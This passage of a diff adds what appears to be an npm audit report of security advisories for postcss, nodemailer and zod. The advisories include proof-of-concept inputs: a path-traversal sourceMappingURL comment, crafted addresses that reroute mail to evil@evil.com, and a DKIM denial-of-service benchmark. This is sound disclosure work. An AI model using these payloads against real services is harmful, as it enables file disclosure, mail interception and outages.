'/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "reported_by": null,
+      "title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73646"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.17",
+      "github_advisory_id": "GHSA-r28c-9q8g-f849",
+      "recommendation": "Upgrade to version 8.5.18 or later",
+      "patched_versions": ">=8.5.18",
+      "updated": "2026-08-13T17:55:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+    },
+    "1240113": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-g57g-f23g-4646\n- https://github.com/nodemailer/nodemailer/commit/2f36eb1aa1dd33e312411dc9b888548e14db54ee\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.9\n- https://github.com/advisories/GHSA-g57g-f23g-4646",
+      "created": "2026-09-29T23:44:04.000Z",
+      "id": 1240113,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nNodemailer's address parser can produce an unexpected recipient address when an RFC 5322 comment follows the domain of an address whose local-part is a quoted string.\n\nFor example:\n\n```text\n\"user\"@example.com(x)evil.com\n```\n\nis parsed as:\n\n```text\n{\n  address: \"user@example.com evil.com\",\n  name: \"\"\n}\n```\n\nThe resulting address therefore contains additional attacker-controlled domain text separated by a literal space.\n\nThe parsed `.address` value is subsequently propagated into the SMTP envelope:\n\n```text\nsrc/addressparser/index.ts\n        ↓\nrecipient.address\n        ↓\nsrc/mime-node/index.ts\n        ↓\nenvelope.to\n```\n\nThe envelope construction uses the parsed address without another strict address validation step.\n\nThis appears to be a variant of the RFC 5322 comment parsing issue addressed by GHSA-cc9r-2j5m-2m83, but it follows a different parser path when the local-part is quoted.\n\n## Reproduction\n\nInput:\n\n```text\n\"user\"@example.com(x)evil.com\n```\n\nObserved parser output:\n\n```text\naddress: \"user@example.com evil.com\"\nname: \"\"\n```\n\nA second example:\n\n```text\n\"a\"@b.com(c)d.com(e)f.com\n```\n\nproduces:\n\n```text\naddress: \"a@b.com d.com f.com\"\nname: \"\"\n```\n\nFor comparison, the corresponding unquoted form:\n\n```text\nuser@example.com(x)evil.com\n```\n\ntakes a different code path and is handled by the existing protection differently.\n\n## Technical Details\n\nThe issue is caused by different parsing behavior for quoted and unquoted local-parts.\n\nThe quoted-local-part variant allows the comment-separated trailing domain atoms to remain in the resulting `.address` value.\n\nThat value is then used when constructing the message envelope:\n\n```text\nenvelope.to = recipients.map(to => to.address as string)\n```\n\nNo additional strict recipient validation is performed at this boundary.\n\n## Security Impact\n\nThe confirmed impact is that attacker-controlled comment content can result in a malformed/ambiguous recipient address being accepted by the parser and propagated into `envelope.to`.\n\nThe reporter did **not confirm successful delivery to an unintended recipient through a real SMTP server using this exact quoted-local-part variant**.\n\nThe remaining question is how real SMTP servers and other Nodemailer transports handle an envelope recipient containing a value such as:\n\n```text\nuser@example.com evil.com\n```\n\nAn end-to-end SMTP test is required to determine whether this parser behavior results in an exploitable delivery or recipient-validation bypass.\n\n## Relationship to GHSA-cc9r-2j5m-2m83\n\nThis report is intended as a potential variant/follow-up to GHSA-cc9r-2j5m-2m83.\n\nThe existing advisory addresses RFC 5322 comment handling in email domains. This report identifies a separate parser path involving quoted local-parts that can preserve additional domain-like content in the normalized address.\n\nPlease evaluate whether this behavior is already covered by the existing fix or represents a remaining parser variant.\n\n## Suggested Fix\n\nThe parser should consistently reject or correctly terminate addresses containing trailing domain atoms after RFC 5322 comments, regardless of whether the local-part is quoted.\n\nIn particular:\n\n```text\n\"user\"@example.com(x)evil.com\n```\n\nshould not result in:\n\n```text\nuser@example.com evil.com\n```\n\nThe envelope-generation layer should also avoid assuming that a parser-produced address is safe for SMTP delivery without appropriate validation.\n\n## Verification Status\n\nConfirmed:\n\n* Parser accepts the quoted-local-part variant.\n* Parser produces an address containing additional attacker-controlled text.\n* The resulting address is propagated into `envelope.to`.\n\nNot confirmed by reporter:\n\n* Successful delivery through a real SMTP server.\n* Delivery to an unintended recipient.\n* Exploitability against a specific downstream SMTP implementation.",
+      "reported_by": null,
+      "title": "Nodemailer: Quoted local-part can produce malformed envelope recipient through RFC 5322 comment parsing",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=9.1.0 <10.0.9",
+      "github_advisory_id": "GHSA-g57g-f23g-4646",
+      "recommendation": "Upgrade to version 10.0.9 or later",
+      "patched_versions": ">=10.0.9",
+      "updated": "2026-09-29T23:44:05.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-g57g-f23g-4646"
+    },
+    "1242826": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-39m8-27wv-hr27\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110871\n- https://github.com/nodemailer/nodemailer/commit/28a5909cec27646cb001dc7e97a8f5d26c973078\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.10\n- https://www.vulncheck.com/advisories/nodemailer-3.0.0-before-10.0.10-quadratic-dkim-header-unfolding-denial-of-service\n- https://github.com/advisories/GHSA-39m8-27wv-hr27",
+      "created": "2026-10-22T16:07:04.000Z",
+      "id": 1242826,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen nodemailer DKIM-signs an outbound message, its DKIM message parser unfolds RFC 5322 header continuation lines with a loop that concatenates each continuation line onto the preceding line and then re-tests the anchored regex `/^[ \\t]/` against the growing merged line on every iteration. Re-testing the regex against the ever-growing accumulated line forces a full string flatten proportional to the accumulated length on each iteration, yielding O(n^2) CPU in the number of continuation lines. An application user who influences the size of a header that folds into many continuation lines (most naturally a large recipient list, but also a long custom header, Subject, or References) can drive tens of thousands of continuation lines and block the single-threaded Node.js event loop for seconds during signing, a repeatable denial of service.\n\n## Root Cause\n\nThe invariant that signing a message performs work linear in the message size is violated in the header-unfolding step. In `src/dkim/message-parser.ts`, `parseHeaders()` splits the buffered header block into `lines` and iterates backward; for each line matching the continuation pattern `/^[ \\t]/`, it does `lines[i - 1] += '\\n' + lines[i]` and `lines.splice(i, 1)`. The dominant cost is not the array splice: iterating backward keeps each splice near the shrinking tail, so it shifts only the few trailing header lines. The quadratic cost is the anchored regex test `/^[ \\t]/.test(lines[i])` (together with the `+=` concatenation) evaluated against the growing merged line on every iteration. The `+=` builds an O(1) rope, but the next iteration's regex test forces a full flatten of the entire accumulated line, so the total cost is the sum over all continuation lines, which is O(n^2). The header block is buffered by `checkHeaders` without any size or line-count cap; the DKIM signer's `MAX_MESSAGE_SIZE` and `cacheTreshold` knobs gate the body stream only, not the header block, so nothing bounds the number of continuation lines fed to the loop.\n\n```text\nAffected file and function (verified at the published v10.0.9 artifact, in src/ and compiled verbatim into the published dist output):\n- src/dkim/message-parser.ts: MessageParser.parseHeaders (the continuation-unfold loop that re-tests /^[ \\t]/ against the growing merged line)\n```\n\n## Impact\n\nAn attacker or user who can make an outbound, DKIM-signed message carry a header that folds into a large number of continuation lines can freeze the sending Node.js process during signing. Because Node.js is single-threaded, the synchronous unfold loop starves the entire event loop, halting all other work in the process, and it is repeatable on every such message. The natural lever is a large recipient list: nodemailer's own MIME composer folds a To or Cc value at column 76 into space-prefixed continuation lines, and the count scales linearly with the number of recipients, so a caller-supplied recipient list (common in bulk-mail, notification, and multi-tenant email APIs) turns into tens of thousands of continuation lines. The single precondition is that DKIM signing is enabled, which is a mainstream deliverability configuration. Independent reproduction on Node.js 24 measured roughly 2.8 seconds of event-loop blocking at about 20,000 continuation lines and roughly 11.5 seconds at about 40,000, scaling quadratically; the full composer-to-signer chain with a 60,000-recipient To header blocked for roughly 6.6 seconds. The applications that cap recipient count or header size shrink the exposed population but do not change the per-message availability impact once a large header is accepted.\n\n## Proof of Concept\n\n`Node.js 24; the shipped DKIM signer (require('nodemailer/lib/dkim')) or the exact unfold loop.`\n\nSteps: (1) construct a message whose header block contains one header value folded into many space-prefixed continuation lines (for example by supplying a very large recipient list, which nodemailer's MIME composer folds automatically); (2) DKIM-sign it and observe the event loop stall while `parseHeaders` unfolds the block. A minimal microbenchmark of the exact unfold logic demonstrates the complexity:\n\n```js\n// Reproduces the parseHeaders unfold loop verbatim (Node 24).\nfunction unfold(headerBlock) {\n    const lines = headerBlock.split(/\\r?\\n/);\n    for (let i = lines.length - 1; i > 0; i--) {\n        if (/^[ \\t]/.test(lines[i])) {\n            lines[i - 1] += '\\n' + lines[i];\n            lines.splice(i, 1);\n        }\n    }\n    return lines;\n}\nfunction run(n) {\n    let block = 'To: a@b.c\\r\\n';\n    for (let i = 0; i < n; i++) block += ' cont-' + i + '@example.com,\\r\\n';\n    for (let k = 0; k < 5; k++) block += 'X-H' + k + ': v\\r\\n';\n    const t = Date.now();\n    unfold(block);\n    return Date.now() - t;\n}\nfor (const n of [5000, 10000, 20000, 40000]) console.log(n, run(n) + 'ms');\n```\n\n```text\n5000   27ms\n10000  542ms\n20000  2853ms\n40000  11503ms\n(2x input yields roughly 4x-5x time: quadratic. The cost is the regex re-flatten of the growing merged line, not the splice.)\n```\n\n## Attack Chain\n\n1. **Exposure:** An application DKIM-signs outbound mail (a mainstream deliverability configuration, enabled per transport or per message) for a message whose header size is influenced by a user, for example a large recipient list, a long custom header, Subject, or References.\n2. **Control:** The attacker or user controls the size of that header. The MIME composer folds it deterministically at column 76 into space-prefixed continuation lines that match the continuation pattern, so the continuation-line count scales linearly with the supplied size.\n3. **Path:** Signing pipes the composed message through the DKIM MessageParser; `checkHeaders` buffers the whole header block into `rawHeaders` and calls `parseHeaders()`, the single sink, on every signed message.\n4. **Guard:** No header-size or line-count cap exists between the input and the sink; the signer's body-only size thresholds do not apply to the header block.\n5. **Primitive:** The unfold loop re-tests the anchored regex against the growing merged line on each continuation line, forcing a full flatten per iteration and yielding O(n^2) synchronous CPU.\n6. **Result:** Event-loop starvation of the single-threaded sending process for an attacker-scaled duration, repeatable per message: a denial of service.\n\n## Bypass Evidence\n\nThe relevant guard would be a cap on header-block size or continuation-line count before unfolding. A search of the DKIM module confirms none exists: `checkHeaders` accumulates header chunks unbounded until the header terminator, and the only size knobs (`MAX_MESSAGE_SIZE`, `cacheTreshold`) are checked against the body stream, not the header block. The strongest disproof attempt was that the backward `splice` makes the loop cheap for a single consecutive folded block (so it would not be quadratic); this was refuted by a mechanism-isolation benchmark: removing the splice entirely leaves the loop just as slow (about 11 seconds at 40,000 lines), while precomputing the continuation test on the original lines so the growing merged line is never re-tested collapses it to a few milliseconds. This proves the quadratic driver is the regex re-flatten of the accumulated line, not the array shift, and confirms the loop is quadratic even for a single consecutive folded block. No published advisory covers this file: the disclosed complexity issues all live in the address parser and recipient-normalization code, and the DKIM message parser has never received a complexity fix.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: nodemailer`\n- `Confirmed affected range: <= 10.0.9`\n- `Latest release checked: nodemailer 10.0.9 (npm registry; vulnerable code verified at git tag v10.0.9 and in the published dist output)`\n- `Fix status: not fixed (no released version removes the quadratic unfold or caps header size)`\n\nThe unfold loop is long-standing DKIM code that predates the address-parser complexity fix family, so the exact introducing release is not positively established and the lower bound is left open; the upper bound is verified against the current published artifact, which is vulnerable with no fix.\n\n## Suggested Fix\n\nEnforce linear-time header unfolding and bound the header block. The key correction is to stop re-scanning the growing accumulated line: classify each line's continuation status on the original split lines before merging, and build the unfolded value with an array plus a single join rather than repeatedly re-testing and concatenating the growing string. Simply replacing `splice` with a filter or two-pointer compaction while still re-testing the merged line would not fix the issue, because the regex re-flatten of the accumulated line is the quadratic driver. Independently, impose a configurable maximum on the buffered header-block size or continuation-line count in the message parser and fail closed when it is exceeded, so an oversized folded header cannot force unbounded work. As an interim mitigation, applications should cap recipient counts and header-value sizes for messages that will be DKIM-signed.\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "Nodemailer: Quadratic (O(n^2)) DKIM header unfolding lets a large folded header cause remote denial of service during signing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110871"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <=10.0.9",
+      "github_advisory_id": "GHSA-39m8-27wv-hr27",
+      "recommendation": "Upgrade to version 10.0.10 or later",
+      "patched_versions": ">=10.0.10",
+      "updated": "2026-10-22T16:07:06.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-39m8-27wv-hr27"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "4.3.6",
+          "paths": [
+            "apps__api>@p2pdotme/sdk>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243091": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8c8m-p3m8-cjg8\n- https://github.com/nodemailer/nodemailer/commit/0a8761762ac78f2db2ba37f712f2a52a404ce011\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-8c8m-p3m8-cjg8",
+      "created": "2026-10-23T21:53:04.000Z",
+      "id": 1243091,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability summary\n\nRFC 5322 comments nest. addressparser ended a comment at the first `)`, including the one that closes a nested comment, and parsed the rest of the outer comment as header text. `Victim (x(y) <evil@evil.com>) <v@victim.com>` names `v@victim.com` with `x(y) <evil@evil.com>` as a comment, and Nodemailer read it as the address `evil@evil.com`. This is the same shape as the escaped parenthesis fixed in 10.1.2, reached through nesting instead of a quoted-pair. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of an address that an application passes to Nodemailer, or the From or To header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application validates a submitted address with a conformant parser and allows only its own domain. The attacker submits `Victim (x(y) <evil@evil.com>) <v@victim.com>`, which validates as `v@victim.com`. Nodemailer delivers to `evil@evil.com`. In the inbound direction, a DMARC or display layer built on a conformant parser and a mail client built on mailparser disagree on the author of the same message, which is the setting for sender spoofing. The boundary crossed is the application's recipient allow list, or the author check of the receiving side.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"Victim (x(y) <evil@evil.com>) <v@victim.com>\"));\n// [ { address: 'evil@evil.com', name: 'Victim) v@victim.com' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as `v@victim.com` with the display name `Victim`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"Victim (x(y) <evil@evil.com>) <v@victim.com>\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail intended for an approved recipient is delivered to an attacker chosen domain, disclosing its content, and parsers built on this module report a different author than conformant ones. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix counts comment depth and ends a comment only at the `)` that closes the outermost one.\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
+      "reported_by": null,
+      "title": "Nodemailer: A nested comment ends early in addressparser, releasing the rest of the comment as a recipient",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-8c8m-p3m8-cjg8",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:53:05.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-8c8m-p3m8-cjg8"
+    },
+    "1243092": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-m943-m63m-w62w\n- https://github.com/nodemailer/nodemailer/commit/1cd57d2b8c49dff048c21cdbafdb54439a7f07e2\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-m943-m63m-w62w",
+      "created": "2026-10-23T21:51:52.000Z",
+      "id": 1243092,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability summary\n\naddressparser ends an RFC 5322 group at the first `;`, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. `G: (a; <evil@evil.com>) <v@victim.com>;` names only `v@victim.com`, and Nodemailer read it as the single recipient `evil@evil.com`. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits `G: (a; <evil@evil.com>) <v@victim.com>;`. The validator sees one mailbox, `v@victim.com`, and approves it. Nodemailer delivers to `evil@evil.com` only. The same works through a quoted display name, `G: \"a;\" \"<evil@evil.com>\" <v@victim.com>;`. The boundary crossed is the application's recipient allow list.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"G: (a; <evil@evil.com>) <v@victim.com>;\"));\n// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as the single mailbox `v@victim.com`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"G: (a; <evil@evil.com>) <v@victim.com>;\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix tracks quoted strings and comments inside a group and reads only a `;` outside them.\n\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
+      "reported_by": null,
+      "title": "Nodemailer: A \";\" inside a quoted string or comment ends an address group early in addressparser, turning display text into a recipient",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-m943-m63m-w62w",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:51:54.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-m943-m63m-w62w"
+    },
+    "1243093": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-85x2-q946-cp5h\n- https://github.com/nodemailer/nodemailer/commit/1cd57d2b8c49dff048c21cdbafdb54439a7f07e2\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-85x2-q946-cp5h",
+      "created": "2026-10-23T21:51:18.000Z",
+      "id": 1243093,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability summary\n\naddressparser ends an angle-addr at the first `>` it sees, including one inside a quoted local part, a comment or a domain literal. The domain is then read off the text in front of that `>`. `<\"a@evil.com>\"@good.com>` is the mailbox `\"a@evil.com>\"@good.com` under RFC 5322, and Nodemailer read it as an address at `evil.com`. The unbracketed spelling of the same value was already read correctly. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of a recipient or sender address that an application passes to Nodemailer, for example a To value entered in a contact or invite form, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application lets users send invitations or notifications only to addresses at an allowed domain and validates the submitted value with a conformant parser or by checking its domain. The attacker submits `<\"a@evil.com>\"@good.com>`, which validates as a `good.com` mailbox. Nodemailer then parses the same value, issues `RCPT TO:<\"\\\"a\"@evil.com>` and the message, with whatever content the application puts into it, is delivered to the attacker's domain. The security boundary crossed is the application's recipient allow list. In the inbound direction, mailparser reports a different address than a conformant reader of the same header, so a display or policy layer built on the two disagrees.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"<\\\"a@evil.com>\\\"@good.com>\"));\n// [ { address: '\"a@evil.com', name: '@good.com>' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as `\"a@evil.com>\"@good.com`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"<\\\"a@evil.com>\\\"@good.com>\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail that an application intends for an allowed domain is delivered to a domain chosen by the attacker, which discloses its content. It is a security vulnerability rather than a parsing bug because the misreading only occurs for values that a conformant validator approves, so validation done the right way is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix tracks quoted strings, comments and domain literals inside an angle-addr and reads only a `>` outside them.\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
+      "reported_by": null,
+      "title": "Nodemailer: A \">\" inside a quoted local part ends an angle-addr early in addressparser, delivering to a domain the header does not name",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-85x2-q946-cp5h",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:51:19.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-85x2-q946-cp5h"
+    },
+    "1243442": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-4ffr-jq9g-5ffx\n- https://github.com/nodemailer/nodemailer/commit/b5a896fcb02df1628329d7cd665ca08490b14b56\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.13\n- https://github.com/advisories/GHSA-4ffr-jq9g-5ffx",
+      "created": "2026-10-27T15:04:39.000Z",
+      "id": 1243442,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nNodemailer's SMTP client applies four regular expressions to a peer's EHLO response to detect the supported SASL mechanisms. Each pattern uses an alternation with two overlapping whitespace-matching sub-patterns, which produces quadratic (O(n^2)) backtracking whenever the mechanism name is absent from the line. A malicious or MITM SMTP server that answers EHLO with `250-AUTH` followed by a long whitespace-only run and a non-matching token blocks the Node.js event loop for tens of seconds to hours during a pre-authentication handshake. No authentication to the target SMTP server is required, and any application that connects to an attacker-influenced host is affected.\n\n## Root Cause\n\nEach of the four AUTH mechanism regexes in `SMTPConnection._actionEHLO` contains the sub-pattern `(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)` before the mechanism literal. `[^\\n]*` and the trailing `\\s+` both match whitespace and can consume the same characters, so when the mechanism literal is absent, the regex engine must try every partition of the whitespace run between `[^\\n]*` and `\\s+` before failing. The four regexes run unconditionally on every EHLO response, with no length cap, no shape validation, and no early rejection before the engine enters the ambiguous alternation.\n\n```text\nComponent: nodemailer (npm), SMTP client\nFunction:  SMTPConnection._actionEHLO\nLocation:  src/smtp-connection/index.ts, lines 2162, 2167, 2172, 